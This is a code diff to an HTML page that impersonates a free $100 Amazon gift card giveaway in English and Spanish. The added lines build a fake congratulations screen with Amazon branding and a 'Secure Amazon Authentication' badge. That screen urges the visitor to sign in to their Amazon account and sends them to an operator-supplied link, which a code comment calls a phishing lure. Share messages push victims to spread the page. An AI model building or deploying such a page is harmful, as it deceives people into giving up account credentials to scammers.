@@ -470,11 +470,121 @@
             100% { transform: rotate(360deg); }
         }
 
+        /* Login Page Styles */
+        .login-page {
+            display: none;
+        }
+
+        .login-page.show {
+            display: block;
+        }
+
+        .main-page.hide {
+            display: none;
+        }
+
+        .congrats-banner {
+            background: linear-gradient(135deg, #00b894 0%, #00cec9 100%);
+            color: white;
+            padding: 30px 20px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0, 184, 148, 0.3);
+        }
+
+        .congrats-banner h2 {
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+
+        @media (max-width: 480px) {
+            .congrats-banner h2 {
+                font-size: 22px;
+            }
+        }
+
+        .congrats-banner p {
+            font-size: 16px;
+            opacity: 0.95;
+        }
+
+        .reward-display {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border: 2px solid #FF9900;
+        }
+
+        .reward-amount {
+            font-size: 48px;
+            font-weight: bold;
+            color: #FF9900;
+            margin: 10px 0;
+        }
+
+        .reward-text {
+            color: #232F3E;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .login-instructions {
+            background: #FFE5CC;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            color: #232F3E;
+            font-size: 14px;
+            border-left: 4px solid #FF9900;
+        }
+
+        .signin-btn {
+            width: 100%;
+            padding: 20px;
+            background: #FF9900;
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(255, 153, 0, 0.3);
+        }
+
+        .signin-btn:hover {
+            background: #232F3E;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(255, 153, 0, 0.4);
+        }
+
+        .signin-btn:active {
+            transform: translateY(0);
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+            color: #666;
+            font-size: 12px;
+        }
+
+        .security-badge::before {
+            content: "🔒";
+            font-size: 16px;
+        }
+
 
     </style>
 </head>
 <body>
-    <div class="container">
+    <!-- MAIN GIFT CARD PAGE -->
+    <div class="container main-page" id="mainPage">
         <div class="language-selector">
             <button class="lang-btn active" onclick="setLanguage('en')" id="langEn">🇺🇸 English</button>
             <button class="lang-btn" onclick="setLanguage('es')" id="langEs">🇪🇸 Español</button>
@@ -499,7 +609,7 @@
             </div>
             <div class="giftcard-amount">$100</div>
             <div class="giftcard-bottom">
-                <div class="giftcard-label" id="giftcardLabel">YOUR CODE</div>
+                <div class="giftcard-label" id="giftcardLabel">DIGITAL CODE</div>
                 <div class="giftcard-code">XXXX-XXXXXX-XXXX</div>
             </div>
         </div>
@@ -536,7 +646,7 @@
 
     <script>
         // ⬇️⬇️⬇️ PUT YOUR LINK HERE ⬇️⬇️⬇️
-        const REDIRECT_URL = 'https://www.amazon.com/';
+        const REDIRECT_URL = 'PUT YOUR LINK HERE';
         // Example: const REDIRECT_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
         // ⬆️⬆️⬆️ PUT YOUR LINK HERE ⬆️⬆️⬆️
         
@@ -562,7 +672,13 @@
                 claimBtnText: '🔒 CLAIM YOUR $100 GIFT CARD',
                 claimBtnActive: '🎁 CLAIM YOUR $100 GIFT CARD NOW!',
                 claimBtnProcessing: 'Processing...',
-                shareMessage: 'Look! I found this free $100 Amazon gift card! Claim yours now before it expires! 🎁\n'
+                shareMessage: 'Look! I found this free $100 Amazon gift card! Claim yours now before it expires! 🎁\n\n',
+                congratsTitle: '🎉 Congratulations! 🎉',
+                congratsSubtitle: "You've successfully unlocked your reward!",
+                rewardText: 'Your Amazon Gift Card',
+                instructionText: 'Please sign in to your Amazon account to claim your $100 gift card. This is required to verify your identity and deliver your reward.',
+                signinBtnText: 'Sign In to Claim Reward',
+                securityText: 'Secure Amazon Authentication'
             },
             es: {
                 badge: 'LIMITADO',
@@ -578,7 +694,13 @@
                 claimBtnText: '🔒 RECLAMA TU TARJETA DE $100',
                 claimBtnActive: '🎁 ¡RECLAMA TU TARJETA DE $100 AHORA!',
                 claimBtnProcessing: 'Procesando...',
-                shareMessage: '¡Mira! ¡Encontré esta tarjeta de regalo gratis de Amazon de $100! ¡Reclama la tuya antes de que expire! 🎁\n\n'
+                shareMessage: '¡Mira! ¡Encontré esta tarjeta de regalo gratis de Amazon de $100! ¡Reclama la tuya antes de que expire! 🎁\n\n',
+                congratsTitle: '🎉 ¡Felicidades! 🎉',
+                congratsSubtitle: '¡Has desbloqueado tu recompensa exitosamente!',
+                rewardText: 'Tu Tarjeta Regalo de Amazon',
+                instructionText: 'Por favor, inicia sesión en tu cuenta de Amazon para reclamar tu tarjeta de regalo de $100. Esto es necesario para verificar tu identidad y entregar tu recompensa.',
+                signinBtnText: 'Iniciar Sesión para Reclamar Recompensa',
+                securityText: 'Autenticación Segura de Amazon'
             }
         };
         
@@ -727,11 +849,33 @@
                 setTimeout(() => {
                     document.getElementById('spinner').style.display = 'none';
                     
-                    // Redirect to the link (rickroll or phishing lure)
-                    if (REDIRECT_URL && REDIRECT_URL !== 'https://www.youtube.com/watch?v=dQw4w9WgXcQ') {
-                        window.location.href = REDIRECT_URL;
-                    }
+                    // Show login page instead of redirecting
+                    showLoginPage();
                 }, 2000);
+            }
+        }
+
+        // Show the login page
+        function showLoginPage() {
+            const t = translations[currentLang];
+            
+            // Update login page text based on language
+            document.getElementById('congratsTitle').textContent = t.congratsTitle;
+            document.getElementById('congratsSubtitle').textContent = t.congratsSubtitle;
+            document.getElementById('rewardText').textContent = t.rewardText;
+            document.getElementById('instructionText').textContent = t.instructionText;
+            document.getElementById('signinBtnText').textContent = t.signinBtnText;
+            document.getElementById('securityText').textContent = t.securityText;
+            
+            // Hide main page and show login page
+            document.getElementById('mainPage').classList.add('hide');
+            document.getElementById('loginPage').classList.add('show');
+        }
+
+        // Redirect to the rickroll/lure link
+        function redirectToLogin() {
+            if (REDIRECT_URL && REDIRECT_URL !== 'PUT YOUR LINK HERE') {
+                window.location.href = REDIRECT_URL;
             }
         }
     </script>
